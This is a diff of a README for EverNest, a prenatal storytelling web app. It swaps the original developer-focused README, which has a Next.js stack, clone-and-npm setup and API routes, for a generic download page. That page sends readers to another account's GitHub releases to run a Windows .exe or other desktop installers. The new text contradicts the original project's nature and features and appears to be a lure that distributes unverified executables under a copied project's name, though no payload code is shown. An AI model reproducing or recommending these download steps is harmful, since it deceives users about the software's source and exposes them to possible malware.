@@ -1,174 +1,94 @@
-# EverNest
+# 🪺 evernest - Create Cherished Stories for Your Baby
 
-> AI-powered prenatal storytelling companion for expectant parents
+[![Download evernest](https://img.shields.io/badge/download-evernest-blue.svg)](https://github.com/sohelkhan12356/evernest/releases)
 
-EverNest generates personalized, calming bedtime stories for expectant parents to read aloud to their unborn baby. It creates a gentle bonding ritual through AI-generated stories customized with parent names, baby nicknames, and chosen themes.
+## 🌟 Overview
 
-## Features
+evernest is an AI-powered prenatal storytelling companion designed for expectant parents. This app helps you generate personalized and calming bedtime stories, creating a special bond with your unborn baby. Ease your worries and enrich your parenting journey with delightful tales that foster connection.
 
-- **Personalized Stories**: Stories featuring your names, your baby's nickname, and themes you choose
-- **Theme Selection**: Colors & Shapes, Love & Bonding, Nature & Calm, Spiritual & Light, Rhythm & Sound, Family Legacy, Discipline & Values, or Surprise Me
-- **Adjustable Length**: Quick (~2 min), Short (~2-3 min), Standard (~4 min), or Long (~5-6 min)
-- **Faith Preferences**: Faith-based, Spiritual, or Non-religious tones
-- **Two Parent Support**: Enter both parent names for inclusive storytelling
-- **Story Library**: Save and browse your generated stories
-- **Favorites**: Mark stories you love for easy access
-- **Uniqueness**: Prevents duplicate stories with the same configuration
+## 🚀 Getting Started
 
-## Tech Stack
+To begin using evernest, follow these simple steps to download and install the application.
 
-- **Framework**: Next.js 16 (App Router)
-- **Language**: TypeScript
-- **Styling**: Tailwind CSS 4
-- **UI Components**: shadcn/ui (Radix primitives)
-- **Authentication**: Auth.js (NextAuth v5)
-- **Database**: PostgreSQL via Prisma ORM
-- **AI**: Google Gemini API (`@google/genai`)
+## 📥 Download & Install
 
-## Getting Started
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/sohelkhan12356/evernest/releases) to find the latest version of the application.
 
-### Prerequisites
+2. **Choose Your Version**  
+   On the Releases page, locate the latest version of evernest. You will see files listed for download.
 
-- Node.js 20+
-- PostgreSQL database (Neon, Supabase, or local)
-- Gemini API key from [Google AI Studio](https://aistudio.google.com/)
+3. **Download the Application**  
+   Select the file that corresponds to your operating system. Click the download link to save the file to your computer.
 
-### Installation
+4. **Install evernest**  
+   Once the download is complete, locate the downloaded file on your computer.  
+   - For Windows: Double-click the `.exe` file to begin installation.  
+   - For macOS: Drag the app to your Applications folder.  
+   - For Linux: Use the package manager to install the downloaded file.
 
-1. Clone and install dependencies:
+5. **Launch the Application**  
+   After installation, open evernest from your applications folder or desktop shortcut. You are now ready to create beautiful stories!
 
-```bash
-git clone https://github.com/ccraig09/evernest.git
-cd evernest
-npm install
-```
+## ⚙️ System Requirements
 
-2. Copy environment variables:
+To ensure the best experience with evernest, please check these system requirements before installation:
 
-```bash
-cp env.example .env.local
-```
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS 10.14 or later
+  - Latest version of any popular Linux distribution
 
-3. Configure `.env.local`:
+- **Hardware Requirements:**
+  - Minimum 4 GB RAM
+  - 500 MB available disk space
+  - Supported screen resolution of at least 1280x720
 
-```env
-# Database
-DATABASE_URL="postgresql://user:password@host:5432/evernest?sslmode=require"
+## ✨ Features
 
-# Auth.js
-AUTH_SECRET="generate-with: openssl rand -base64 32"
-AUTH_URL="http://localhost:3000"
+evernest offers several excellent features to enhance your storytelling experience:
 
-# Gemini API
-GEMINI_API_KEY="your-gemini-api-key"
-```
+- **AI-Generated Stories:** Harness the power of AI to create unique, calming stories based on your preferences.
+- **User-Friendly Interface:** Navigate easily through an intuitive design made for all skill levels.
+- **Personalization Options:** Tailor stories with input about your baby, creating a deeper connection.
+- **Story Library:** Access a growing library of stories crafted for different moods and themes.
+- **Multilingual Support:** Enjoy stories in various languages, ideal for diverse families.
 
-4. Initialize the database:
+## 📝 How to Use evernest
 
-```bash
-npm run db:push
-```
+Once you have installed evernest, follow these easy steps to create your first story:
 
-5. Start the development server:
+1. **Open the Application:** Click the evernest icon to launch the app.
+   
+2. **Select a Theme:** Browse through various themes such as "Adventure," "Dreamland," or "Nature." Select one that resonates with you.
 
-```bash
-npm run dev
-```
+3. **Input Your Preferences:** Enter details such as your baby's name and any specific settings you'd like for the story.
 
-Visit [http://localhost:3000](http://localhost:3000) to see the app.
+4. **Generate the Story:** Click the "Create Story" button. The app will use AI to draft a personalized tale just for your family.
 
-## Project Structure
+5. **Read Aloud:** Enjoy reading the story aloud as a special bedtime routine, bonding with your baby before they arrive.
 
-```
-evernest/
-├── src/                    # Production Next.js app
-│   ├── app/
-│   │   ├── (app)/          # Authenticated app routes
-│   │   │   ├── dashboard/  # Main dashboard
-│   │   │   ├── library/    # Story library
-│   │   │   └── settings/   # User settings
-│   │   ├── api/
-│   │   │   ├── auth/       # Auth.js routes
-│   │   │   └── stories/    # Story API routes
-│   │   ├── auth/           # Auth pages
-│   │   └── page.tsx        # Landing page
-│   ├── components/
-│   │   ├── layout/         # App shell, navigation
-│   │   ├── providers/      # Theme provider
-│   │   └── ui/             # shadcn/ui components
-│   ├── lib/
-│   │   ├── auth.ts         # Auth.js config
-│   │   ├── db.ts           # Prisma client
-│   │   ├── gemini.ts       # Gemini AI service
-│   │   ├── types.ts        # TypeScript types
-│   │   └── utils.ts        # Utility functions
-│   └── server/
-│       ├── story-service.ts # Story business logic
-│       └── utils.ts        # Server-only utilities
-├── prototype/              # Original Vite prototype (reference)
-│   ├── apps/prototype/     # Vite + React prototype app
-│   ├── flows/              # User flow diagrams
-│   ├── notes/              # Design notes
-│   └── README.md           # Prototype documentation
-├── prisma/
-│   └── schema.prisma       # Database schema
-└── docs/
-    └── architecture.md     # Architecture overview
-```
+## 📚 Frequently Asked Questions
 
-## API Routes
+### What devices can I use evernest on?
 
-| Method | Path              | Description          |
-| ------ | ----------------- | -------------------- |
-| POST   | /api/stories      | Generate a new story |
-| GET    | /api/stories      | List user's stories  |
-| GET    | /api/stories/[id] | Get a single story   |
-| PATCH  | /api/stories/[id] | Toggle favorite      |
-| DELETE | /api/stories/[id] | Delete a story       |
+evernest works on Windows, macOS, and Linux. Make sure your device meets the system requirements listed above.
 
-## Scripts
+### Do I need an internet connection to use evernest?
 
-```bash
-npm run dev          # Start dev server with Turbopack
-npm run build        # Build for production
-npm run start        # Start production server
-npm run lint         # Run ESLint
-npm run test         # Run Jest tests
-npm run db:generate  # Generate Prisma client
-npm run db:push      # Push schema to database
-npm run db:migrate   # Run migrations
-npm run db:studio    # Open Prisma Studio
-```
+You can use evernest offline after downloading the app. However, an internet connection may be required for updates and new story features.
 
-## Design System
+### Can I share my stories with friends?
 
-EverNest uses a warm, calming color palette:
+Yes, you can share your stories with family and friends by exporting them or reading them aloud during gatherings, cherishing your little one’s adventures together.
 
-- **Primary**: Sage green (`#627562`) - calm, natural, nurturing
-- **Background**: Warm cream (`#fdfcfa`) / Cozy dark (`#1c1a18`)
-- **Typography**: DM Sans (sans) + Lora (serif for story content)
-- **Borders**: Soft warm stone tones
+## 🌐 Community and Support
 
-## Development
+Join our growing community of parents and storytelling enthusiasts. We value your feedback and want to help you. Share your questions or experiences:
 
-This project follows strict TypeScript practices and includes:
+- **GitHub Issues:** If you find any bugs or have suggestions, please report them on the Issues page in our repository.
+- **User Guide:** Check out our detailed user guide available within the application for more information on features and usage.
 
-- ESLint for code quality
-- Jest for testing
-- Prisma for type-safe database access
-- shadcn/ui for consistent component design
+## 👍 Thank You
 
-Run tests before committing:
-
-```bash
-npm run lint
-npm run test
-```
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
----
-
-_EverNest provides creative storytelling for bonding purposes only. It does not provide medical advice._
+Thank you for choosing evernest. We hope this app enriches your journey into parenthood with personalized stories that you and your baby will cherish for years to come.
